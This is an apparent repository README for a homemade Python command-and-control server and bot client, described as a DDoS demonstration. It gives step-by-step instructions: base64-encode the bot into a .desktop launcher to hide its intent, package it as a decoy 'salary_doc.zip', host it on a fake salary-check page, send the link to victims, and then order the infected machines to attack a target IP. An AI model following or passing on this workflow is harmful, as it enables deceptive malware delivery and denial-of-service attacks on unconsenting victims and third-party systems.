# C2_Server
This repository contains code for a C2 server and Bot client I built using Python. This demonstrates how a ***DDOS (Distributed Denial of Service) Attack*** takes place.

# More Info
The bot_client.py code in the C2_SERVER folder is encoded and placed inside a bot.desktop application to bypass or hide its main intent. You can create an encoding of bot_client.py by running:
```bash
$ base64 bot_client.py > encoded.txt
```
Once that is done, create a **bot.desktop** file and fill in the content of the encoded.txt in the **Exec=** section of the **bot.desktop** file.
Next, let's zip it:
```bash
$ zip salary_doc.zip bot.desktop
```
Next, start up the **c2_server.py** code from your Kali or attacker's terminal:
```bash
$ python3 c2_server.py
```
Next, host this **salary_doc.zip** using Apache2 as it comes pre-installed on Kali Linux. Host it at ***/var/www/html/check_salary.html*** with the following content:
```bash
<html>
<body>
        <a href="salary_doc.zip">Click to download</a>
</body>
</html>
```
Next, send the link to the victim or the target machine or computer, once they click on **Click to download**, their browser will automatically start downloading the salary_doc.zip file.
Once they unzip and click on it, your running C2 server will receive a connection from the machine! You can now send a command to it via your C2 server: 
```bash
$ attack <ip>
```

This will inform or instruct the victim machine (now our bot) to attack the target IP or machine. This kinda demonstrates a **DDOS (Distributed Denial of Service)** attack!

**HAPPY HACKING!**
